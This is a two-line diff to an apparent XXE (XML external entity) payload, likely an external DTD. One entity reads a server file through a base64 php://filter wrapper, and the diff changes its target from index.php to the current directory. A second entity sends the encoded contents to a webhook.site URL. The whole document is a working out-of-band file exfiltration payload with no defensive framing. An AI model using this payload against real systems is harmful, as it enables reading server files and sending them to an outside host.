@@ -1,2 +1,2 @@
-<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=.">
 <!ENTITY % return "<!ENTITY exfil SYSTEM 'https://webhook.site/30080917-06bf-4099-8530-6d9b04419d49/?%data;'>">
